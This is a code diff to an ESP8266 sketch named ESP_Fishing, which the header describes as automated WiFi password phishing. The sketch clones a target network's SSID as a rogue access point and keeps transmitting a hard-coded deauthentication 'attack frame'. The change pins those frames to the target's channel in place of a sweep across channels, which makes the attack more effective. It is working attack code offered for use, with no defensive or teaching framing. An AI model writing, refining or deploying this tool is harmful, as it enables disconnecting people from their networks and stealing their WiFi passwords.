@@ -1,5 +1,5 @@
 /*
-  ESP_Fishing v1.1
+  ESP_Fishing v1.2
   ESP82266 自动化WiFi密码钓鱼
   by：发明控
   仓库地址：https://github.com/bilibilifmk/ESP_Fishing
@@ -18,6 +18,7 @@
 */
 #include <wifi_link_tool.h>
 String wifiname, wifipassword;
+uint8_t ch = 1;
 //攻击帧
 uint8_t packet[26] = {
   0xC0, 0x00,
@@ -127,7 +128,7 @@ void wifiup()
       Serial.println(WiFi.SSID(i) + " " + WiFi.RSSI(i));
       if (WiFi.SSID(i) == ssid) {
         packetset(WiFi.BSSID(i));
-
+        ch = WiFi.channel(i);
         zt = 1;
       }
     }
@@ -137,6 +138,7 @@ void wifiup()
       webServer.send(200, "text/plain", "1");
       delay(2000);
       WiFi.softAP(wifiname);
+      wifi_set_channel(ch);
       digitalWrite(2, HIGH); //关闭指示灯
     } else {
       wifiname = "";
@@ -180,12 +182,10 @@ void wifiup()
       }
 
 
-
     } else
     {
       webServer.send(200, "text/plain", "0");//错误
     }
-
 
 
   }
@@ -223,7 +223,6 @@ void setup() {
     file.close();
   });
   webServer.begin();
-
   pinMode(2, OUTPUT);   //设置指示灯
   digitalWrite(2, LOW);
 }
@@ -233,13 +232,10 @@ void loop() {
   if (wifiname != "") {
     MDNS.update();
     dnsServer.processNextRequest();
+    wifi_send_pkt_freedom(packet, 26, 0);
+    //发送攻击帧
+    delay(10);
 
-    for (int k = 1; k < 14; k++) {
-      wifi_set_channel(k);
-      wifi_send_pkt_freedom(packet, 26, 0);
-      //发送攻击帧
-      delay(1);
-    }
   }
 
 
